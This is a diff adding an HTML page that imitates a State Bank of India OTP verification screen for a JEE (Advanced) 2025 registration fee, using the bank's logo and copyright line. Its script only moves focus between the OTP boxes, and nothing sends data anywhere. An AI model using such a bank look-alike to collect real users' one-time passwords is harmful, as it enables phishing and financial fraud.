@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SBI Secure OTP Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .sbi-container {
+            width: 400px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            text-align: center;
+        }
+        .sbi-header {
+            margin-bottom: 20px;
+        }
+        .sbi-logo {
+            width: 100px;
+            margin-bottom: 15px;
+        }
+        .sbi-title {
+            color: #2a5b8c;
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        .sbi-subtitle {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+        .otp-input {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .otp-input input {
+            width: 40px;
+            height: 40px;
+            text-align: center;
+            font-size: 18px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        .otp-input input:focus {
+            border-color: #2a5b8c;
+            outline: none;
+        }
+        .sbi-btn {
+            background-color: #2a5b8c;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            width: 100%;
+            margin-top: 15px;
+        }
+        .sbi-btn:hover {
+            background-color: #1e4a7a;
+        }
+        .resend-otp {
+            color: #2a5b8c;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 15px;
+            display: inline-block;
+        }
+        .sbi-footer {
+            margin-top: 25px;
+            font-size: 12px;
+            color: #999;
+        }
+        .secure-banner {
+            background-color: #f0f7ff;
+            padding: 10px;
+            border-radius: 4px;
+            margin: 20px 0;
+            font-size: 13px;
+            color: #2a5b8c;
+        }
+    </style>
+</head>
+<body>
+    <div class="sbi-container">
+        <div class="sbi-header">
+            <img src="https://www.sbi.co.in/documents/16012/67817/SBI-logo.png" alt="SBI Logo" class="sbi-logo">
+            <div class="sbi-title">STATE BANK OF INDIA</div>
+            <div class="sbi-subtitle">Secure OTP Verification</div>
+        </div>
+
+        <div class="secure-banner">
+            🔒 Secure transaction for JEE (Advanced) 2025 Registration Fee
+        </div>
+
+        <div>
+            OTP sent to mobile ending with <strong>******398</strong>
+        </div>
+
+        <div class="otp-input">
+            <input type="text" maxlength="1" pattern="[0-9]">
+            <input type="text" maxlength="1" pattern="[0-9]">
+            <input type="text" maxlength="1" pattern="[0-9]">
+            <input type="text" maxlength="1" pattern="[0-9]">
+            <input type="text" maxlength="1" pattern="[0-9]">
+            <input type="text" maxlength="1" pattern="[0-9]">
+        </div>
+
+        <button class="sbi-btn">VERIFY & PAY ₹3,200</button>
+
+        <div class="resend-otp">
+            Didn't receive OTP? <strong>Resend OTP</strong>
+        </div>
+
+        <div class="sbi-footer">
+            <p>For security reasons, do not share this OTP with anyone</p>
+            <p>© State Bank of India. All Rights Reserved.</p>
+        </div>
+    </div>
+
+    <script>
+        // Auto-focus and jump between OTP inputs
+        const inputs = document.querySelectorAll('.otp-input input');
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value.length === 1) {
+                    if (index < inputs.length - 1) {
+                        inputs[index + 1].focus();
+                    }
+                }
+            });
+            
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && e.target.value === '') {
+                    if (index > 0) {
+                        inputs[index - 1].focus();
+                    }
+                }
+            });
+        });
+    </script>
+</body>
+</html>
